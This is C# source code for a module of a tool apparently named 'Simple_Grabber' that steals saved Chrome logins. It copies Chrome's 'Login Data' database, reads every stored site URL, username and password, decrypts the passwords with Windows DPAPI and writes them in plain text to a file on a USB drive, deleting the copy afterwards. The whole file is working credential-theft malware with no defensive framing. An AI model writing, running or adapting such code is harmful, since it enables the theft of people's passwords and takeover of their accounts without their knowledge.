﻿using System;
using System.Data.SQLite;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using Dapper;


namespace Simple_Grabber.Modules
{
    public class User
    {
        public string Action_url { get; set; }

        public string Username_value { get; set; }

        public byte[] Password_value { get; set; }
    }

    public class Chrome
    {
        // Default file path for the database

        public static string FolderPath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\Google\Chrome\User Data\Default";
        
        private static StringBuilder GetDatabaseEntries()
        {
            var databaseEntries = new StringBuilder();
            
            // Create a copy of the database - Chrome has the original database open and is therefore locked

            if(File.Exists(FolderPath + @"\Login Data Copy"))
            {
                File.Delete(FolderPath + @"\Login Data Copy");

                File.Copy(FolderPath + @"\Login Data", FolderPath + @"\Login Data Copy");
            }

            else
            {
                File.Copy(FolderPath + @"\Login Data", FolderPath + @"\Login Data Copy");
            }

            using (var connection = new SQLiteConnection("Data Source=" + FolderPath + @"\Login Data Copy"))
            {
                // Query used to get the database entries

                var statement = "SELECT action_url, username_value, password_value FROM logins";

                // Open the database

                connection.Open();

                // Build a list of objects from the database query

                var users = connection.Query<User>(statement);

                foreach (var user in users)
                {
                    // Decrypt the password

                    var decryptedPassword = Encoding.UTF8.GetString(ProtectedData.Unprotect(user.Password_value, null, DataProtectionScope.CurrentUser));

                    databaseEntries.AppendLine($"{user.Action_url} : {user.Username_value} : {decryptedPassword}");
                }
            }

            // Delete the database copy

            File.Delete(FolderPath + @"\Login Data Copy");

            return databaseEntries;
        }

        public static void WriteToFile(string USBPath)
        {
            var databaseEntries = GetDatabaseEntries();

            if (!File.Exists(USBPath + @"Data\Chrome.txt"))
            {
                File.Create(USBPath + @"Data\Chrome.txt");
            }

            File.WriteAllText(USBPath + @"Data\Chrome.txt", databaseEntries.ToString());    
        }
    }
}
